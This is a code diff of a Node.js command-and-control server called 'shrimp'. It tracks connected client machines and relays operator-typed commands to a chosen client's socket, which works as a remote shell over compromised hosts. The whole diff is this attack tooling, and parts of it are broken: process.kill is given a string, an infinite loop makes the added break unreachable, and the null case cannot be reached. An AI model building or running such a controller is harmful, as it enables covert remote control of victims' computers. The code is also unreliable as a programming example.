@@ -19,30 +19,35 @@ const server = net.createServer((socket) => {
  });
 });
 
-server.listen(8000, () => {
+server.listen(8080, () => {
  console.log('Command and Control server listening on port 8080');
 });
 
-process.on('SIGINT', () => {
- console.log('\nGracefully shutting down from SIGINT (Ctrl-C)');
- process.exit(0);
-});
+function exit() {
+  process.kill("Shutting down shrimp server.");
+}
 
 // Handle user input separately from the server
 setInterval(() => {
  let input = prompt("shrimp! >>");
- switch (input) {
+ switch (input.split(" ")[0]) {
   case "set":
+    console.log("set detected with" + input.split(" ")[1]);
     const id = input.split(" ")[1];
     currentId = id;
     while (true){
       const promptForId = prompt(clients[currentId].hostname+'$');
       console.log(promptForId);
       clients[currentId].socketObject.write(promptForId+"\n");
-
   }
+  break;
+
   case "list":
     console.log(clients);
-
+  break;
+  
+  case null:
+    exit();
+  break;
  }
 }, 1000);
